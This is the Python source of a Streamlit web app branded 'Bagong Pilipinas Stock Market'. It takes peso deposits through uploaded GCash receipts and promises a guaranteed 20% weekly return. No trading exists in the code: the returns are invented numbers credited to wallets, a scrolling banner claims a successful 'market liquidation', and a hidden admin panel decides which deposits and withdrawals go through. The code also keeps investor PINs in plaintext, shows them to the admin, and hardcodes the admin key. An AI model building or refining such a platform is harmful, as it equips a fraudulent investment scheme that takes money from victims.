import streamlit as st
import json
import os
import shutil
from datetime import datetime, timedelta
import time
import pandas as pd

# --- 1. SESSION INITIALIZER ---
if 'user' not in st.session_state: st.session_state.user = None
if 'page' not in st.session_state: st.session_state.page = "main"
if 'is_boss' not in st.session_state: st.session_state.is_boss = False
if 'confirm_amt' not in st.session_state: st.session_state.confirm_amt = False

if not os.path.exists("receipts"):
    os.makedirs("receipts")

# --- 2. DATA ENGINE ---
REGISTRY_FILE = "bpsm_registry.json"
BACKUP_FILE = "bpsm_backup.json"

def load_registry():
    for file in [REGISTRY_FILE, BACKUP_FILE]:
        if os.path.exists(file):
            try:
                with open(file, "r") as f:
                    return json.load(f)
            except: continue
    return {}

def update_user(name, data):
    reg = load_registry()
    reg[name] = data
    with open(REGISTRY_FILE, "w") as f:
        json.dump(reg, f, default=str)
    shutil.copy(REGISTRY_FILE, BACKUP_FILE)

# --- 3. UI STYLING ---
st.set_page_config(page_title="BPSM Official", layout="wide")
st.markdown("""
    <style>
    [data-testid="stSidebar"] { display: none; }
    header { visibility: hidden; }
    .stApp { background-color: #0b0c0e; color: white; }
    .block-container { padding: 0 !important; max-width: 100% !important; }
    .user-box { text-align: center; padding: 30px 10px; background: #111217; border-bottom: 1px solid #2a2b30; }
    .balance-val { color: #0dcf70; font-size: 3.5rem; font-weight: 900; margin: 5px 0; }
    .section-header { background: #1c1e24; padding: 12px 20px; margin-top: 25px; border-left: 5px solid #0dcf70; font-weight: bold; text-transform: uppercase; color: #0dcf70; }
    .ticker-wrap { background: #000; color: #0dcf70; padding: 12px 0; position: fixed; bottom: 0; width: 100%; font-size: 0.85rem; border-top: 1px solid #2a2b30; z-index: 999; overflow: hidden; }
    @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
    .ticker-text { display: inline-block; white-space: nowrap; animation: ticker 25s linear infinite; font-weight: bold; }
    .stButton>button { border-radius: 12px !important; height: 3.5rem !important; font-weight: bold !important; width: 100%; }
    .roi-text { color: #0dcf70; font-weight: bold; font-size: 1.2rem; }
    .time-label { color: #8c8f99; font-size: 0.85rem; }
    .total-roi-label { color: #0dcf70; font-size: 0.9rem; font-weight: bold; }
    </style>
    """, unsafe_allow_html=True)

# --- 4. ACCESS CONTROL ---
if st.session_state.user is None and not st.session_state.is_boss:
    st.markdown("<div style='background: linear-gradient(135deg, #0038a8 0%, #ce1126 100%); padding: 40px 20px; text-align: center;'><h1>BAGONG PILIPINAS<br>STOCK MARKET</h1><p>Automatic Weekly Payouts | 20% Weekly ROI</p></div>", unsafe_allow_html=True)
    t1, t2 = st.tabs(["🔑 SIGN-IN", "📝 REGISTER"])
    
    with t1:
        ln = st.text_input("INVESTOR NAME", key="login_name").upper()
        lp = st.text_input("SECURE PIN", type="password", max_chars=6, key="login_pin")
        if st.button("VERIFY & ACCESS"):
            reg = load_registry()
            if ln in reg and reg[ln].get('pin') == lp:
                st.session_state.user = ln
                st.rerun()
            else:
                st.error("Invalid Credentials")
    
    with t2:
        rn = st.text_input("FULL LEGAL NAME", key="reg_name").upper()
        rp = st.text_input("CREATE 6-DIGIT PIN", type="password", max_chars=6, key="reg_pin")
        referrer = st.text_input("REFERRER NAME (OPTIONAL)", key="reg_ref").upper()
        if st.button("CREATE ACCOUNT"):
            reg = load_registry()
            if rn and len(rp) == 6:
                new_data = {"pin": rp, "wallet": 0.0, "inv": [], "tx": [], "ref_by": referrer if referrer in reg else None, "ref_bonus_requested": False, "ref_bonus_claimed": False, "ref_earnings": 0.0}
                update_user(rn, new_data)
                st.success("Account Created! Please Sign-In.")
                time.sleep(1.5)
                st.rerun()
    
    st.divider()
    with st.expander("MASTER ACCESS"):
        key = st.text_input("Admin Key", type="password", key="admin_key")
        if st.button("ENTER CONTROL PANEL"):
            if key == "Orange01!":
                st.session_state.is_boss = True
                st.rerun()
    st.stop()

# --- 5. INVESTOR PORTAL ---
if st.session_state.user:
    name = st.session_state.user
    reg = load_registry()
    data = reg[name]
    now = datetime.now()

    payout_triggered = False
    for i in data.get('inv', []):
        try:
            if 'end' in i:
                end_time = datetime.fromisoformat(i['end'])
                if now >= end_time: 
                    profit_amt = i['amt'] * 0.20
                    data['wallet'] += profit_amt
                    i['start'] = now.isoformat()
                    i['end'] = (now + timedelta(days=7)).isoformat()
                    data.setdefault('tx', []).append({"date": now.strftime("%Y-%m-%d %H:%M"), "type": "WEEKLY ROI CREDIT", "amt": profit_amt, "status": "SUCCESSFUL_WD"})
                    payout_triggered = True
        except: continue
    if payout_triggered:
        update_user(name, data); st.rerun()

    st.markdown("""<div class="ticker-wrap"><div class="ticker-text">🔥 FLASH: Market liquidation successful! All Weekly payouts credited. | 🚀 JOIN NOW: 20% Weekly ROI Guaranteed</div></div>""", unsafe_allow_html=True)
    st.markdown(f"<div class='user-box'><p style='color:#8c8f99;'>WITHDRAWABLE BALANCE</p><h1 class='balance-val'>₱{data['wallet']:,.2f}</h1><p style='color:#8c8f99;'>Account: {name}</p></div>", unsafe_allow_html=True)

    if st.session_state.page == "dep":
        st.markdown("<div class='section-header'>📥 DEPOSIT CAPITAL</div>", unsafe_allow_html=True)
        d_amt = st.number_input("Enter Amount (Min ₱1,000)", min_value=1000.0, step=100.0, disabled=st.session_state.confirm_amt)
        if not st.session_state.confirm_amt:
            if st.button("CONFIRM AMOUNT"): st.session_state.confirm_amt = True; st.rerun()
        else:
            receipt = st.file_uploader("Upload GCash Receipt", type=['jpg', 'png', 'jpeg'])
            if st.button("SUBMIT DEPOSIT"):
                if receipt:
                    f_path = f"receipts/{name}_{int(time.time())}.{receipt.name.split('.')[-1]}"
                    with open(f_path, "wb") as f: f.write(receipt.getbuffer())
                    data.setdefault('tx', []).append({"date": now.strftime("%Y-%m-%d %H:%M"), "type": "DEPOSIT", "amt": d_amt, "status": "PENDING_DEP", "receipt_path": f_path})
                    update_user(name, data)
                    st.session_state.confirm_amt = False; st.session_state.page = "main"; st.success("Submitted!"); st.rerun()
        if st.button("⬅️ BACK"): st.session_state.confirm_amt = False; st.session_state.page = "main"; st.rerun()

    elif st.session_state.page == "wd":
        st.markdown("<div class='section-header'>📤 WITHDRAW FUNDS</div>", unsafe_allow_html=True)
        w_amt = st.number_input("Amount", min_value=1000.0, max_value=max(1000.0, data['wallet']))
        w_bank = st.text_input("BANK/METHOD (GCash, BDO, etc)")
        w_info = st.text_input("ACCOUNT NAME & NUMBER")
        if st.button("SUBMIT WITHDRAWAL"):
            if data['wallet'] >= w_amt:
                data['wallet'] -= w_amt
                data.setdefault('tx', []).append({"date": now.strftime("%Y-%m-%d %H:%M"), "type": "WITHDRAWAL", "amt": w_amt, "info": f"{w_bank}: {w_info}", "status": "PENDING_WD"})
                update_user(name, data); st.session_state.page = "main"; st.rerun()
        if st.button("⬅️ CANCEL"): st.session_state.page = "main"; st.rerun()

    elif st.session_state.page == "reinvest":
        st.markdown("<div class='section-header'>♻️ RE-INVEST FROM BALANCE</div>", unsafe_allow_html=True)
        r_amt = st.number_input("Re-invest Amount (Min ₱1,000)", min_value=1000.0, max_value=max(1000.0, data['wallet']), step=100.0)
        if st.button("START WEEKLY CYCLE"):
            if data['wallet'] >= r_amt:
                data['wallet'] -= r_amt
                st_t = datetime.now()
                data.setdefault('inv', []).append({"amt": r_amt, "start": st_t.isoformat(), "end": (st_t + timedelta(days=7)).isoformat()})
                data.setdefault('tx', []).append({"date": st_t.strftime("%Y-%m-%d %H:%M"), "type": "RE-INVESTMENT", "amt": r_amt, "status": "SUCCESSFUL_DEP"})
                update_user(name, data); st.session_state.page = "main"; st.success("Investment Started!"); st.rerun()
        if st.button("⬅️ BACK"): st.session_state.page = "main"; st.rerun()

    else:
        c1, c2, c3 = st.columns(3)
        with c1: 
            if st.button("📥 DEPOSIT"): st.session_state.page = "dep"; st.rerun()
        with c2: 
            if st.button("📤 WITHDRAW"): st.session_state.page = "wd"; st.rerun()
        with c3:
            if st.button("♻️ RE-INVEST"): st.session_state.page = "reinvest"; st.rerun()

        st.markdown("<div class='section-header'>⏳ ACTIVE WEEKLY CYCLES (20% ROI)</div>", unsafe_allow_html=True)
        if not data.get('inv'): st.write("No active interest running.")
        else:
            for idx, t in enumerate(reversed(data['inv'])):
                actual_idx = len(data['inv']) - 1 - idx
                try:
                    if 'start' not in t: continue
                    start_t, end_t = datetime.fromisoformat(t['start']), datetime.fromisoformat(t['end'])
                    rem, elapsed = end_t - now, now - start_t
                    running_roi = min(t['amt']*0.20, (t['amt']*0.20/10080)*(elapsed.total_seconds()/60))
                    total_weekly_roi = t['amt'] * 0.20
                    
                    st.markdown(f"""
                    <div style='background:#1c1e24; padding:15px; border-radius:15px; border:1px solid #3a3d46; margin-bottom:10px;'>
                        <div style='display:flex; justify-content:space-between;'>
                            <span style='font-weight:bold; font-size:1.1rem;'>Capital: ₱{t['amt']:,}</span>
                            <span class='roi-text'>Accrued ROI: ₱{running_roi:,.2f}</span>
                        </div>
                        <div style='margin-top:5px;'>
                            <span class='time-label'>Deposit Time: {start_t.strftime('%Y-%m-%d %I:%M %p')}</span><br>
                            <span class='time-label'>Maturity Time: {end_t.strftime('%Y-%m-%d %I:%M %p')}</span><br>
                            <span class='total-roi-label'>Total Weekly ROI (20%): ₱{total_weekly_roi:,.2f}</span>
                        </div>
                        <div style='color:#0dcf70; font-size:1.8rem; font-weight:bold; text-align:center; margin-top:10px;'>{str(rem).split('.')[0]}</div>
                    </div>
                    """, unsafe_allow_html=True)
                    
                    is_unlocked = now >= end_t
                    unlock_date_str = end_t.strftime('%Y-%m-%d')
                    btn_label = f"Pull Capital (₱{t['amt']:,})" if is_unlocked else f"Available to Pull Capital after {unlock_date_str}"
                    
                    if st.button(btn_label, key=f"pull_{actual_idx}", disabled=not is_unlocked):
                        data['wallet'] += t['amt']
                        data['inv'].pop(actual_idx)
                        data.setdefault('tx', []).append({"date": now.strftime("%Y-%m-%d %H:%M"), "type": "CAPITAL RECALL", "amt": t['amt'], "status": "SUCCESSFUL_WD"})
                        update_user(name, data); st.rerun()
                except: continue

        st.markdown("<div class='section-header'>📜 TRANSACTION LOGS</div>", unsafe_allow_html=True)
        for t in reversed(data.get('tx', [])):
            st.write(f"{t['date']} | {t['type']} | ₱{t['amt']:,} | {t['status']}")

    if st.sidebar.button("LOGOUT"): 
        st.session_state.user = None
        st.session_state.page = "main"
        st.rerun()

# --- 6. BOSS PANEL ---
elif st.session_state.is_boss:
    all_users = load_registry()
    st.markdown("### 👑 MASTER CONTROL")
    
    # --- MIGRATION & EXPORT ---
    col1, col2 = st.columns(2)
    with col1:
        if st.button("🔴 FORCE MIGRATE: SET ALL TO 7-DAYS"):
            for u_name, u_info in all_users.items():
                migrated = False
                for inv in u_info.get('inv', []):
                    if 'start' in inv:
                        s_dt = datetime.fromisoformat(inv['start'])
                        inv['end'] = (s_dt + timedelta(days=7)).isoformat()
                        migrated = True
                if migrated: update_user(u_name, u_info)
            st.success("Migration Complete!"); st.rerun()
    
    # --- INVESTOR DATABASE VIEW ---
    st.markdown("<div class='section-header'>📋 INVESTOR DATABASE (NAMES, PINS, REFERRALS)</div>", unsafe_allow_html=True)
    db_list = []
    for u_name, u_info in all_users.items():
        db_list.append({
            "NAME": u_name,
            "PIN": u_info.get('pin', 'N/A'),
            "WALLET": f"₱{u_info.get('wallet', 0):,.2f}",
            "REFERRER": u_info.get('ref_by', 'DIRECT')
        })
    st.table(pd.DataFrame(db_list))

    with st.expander("🔍 VIEW ALL INDIVIDUAL TRANSACTIONS"):
        for u_name, u_info in all_users.items():
            st.write(f"**{u_name}**")
            st.json(u_info.get('tx', []))
            st.divider()

    st.markdown("<div class='section-header'>📈 REAL-TIME INVESTOR ROI</div>", unsafe_allow_html=True)
    for u_name, u_info in all_users.items():
        if u_info.get('inv'):
            for inv in reversed(u_info['inv']):
                if 'start' not in inv or 'end' not in inv: continue
                try:
                    rem = datetime.fromisoformat(inv['end']) - datetime.now()
                    st.write(f"👤 {u_name} | Capital: ₱{inv['amt']:,} | ⏳ {str(rem).split('.')[0]}")
                except: continue
    
    st.markdown("<div class='section-header'>🔔 PENDING ACTIONS</div>", unsafe_allow_html=True)
    for u_name, u_info in all_users.items():
        for idx, tx in enumerate(u_info.get('tx', [])):
            if tx['status'] == "PENDING_DEP":
                if st.button(f"Approve ₱{tx['amt']:,} Deposit: {u_name}"):
                    all_users[u_name]['tx'][idx]['status'] = "SUCCESSFUL_DEP"
                    st_t = datetime.now()
                    all_users[u_name].setdefault('inv', []).append({"amt": tx['amt'], "start": st_t.isoformat(), "end": (st_t + timedelta(days=7)).isoformat()})
                    update_user(u_name, all_users[u_name]); st.rerun()
            elif tx['status'] == "PENDING_WD":
                if st.button(f"Approve ₱{tx['amt']:,} Withdrawal: {u_name}"):
                    all_users[u_name]['tx'][idx]['status'] = "SUCCESSFUL_WD"
                    update_user(u_name, all_users[u_name]); st.rerun()
    
    if st.button("EXIT ADMIN"): st.session_state.is_boss = False; st.rerun()
                    
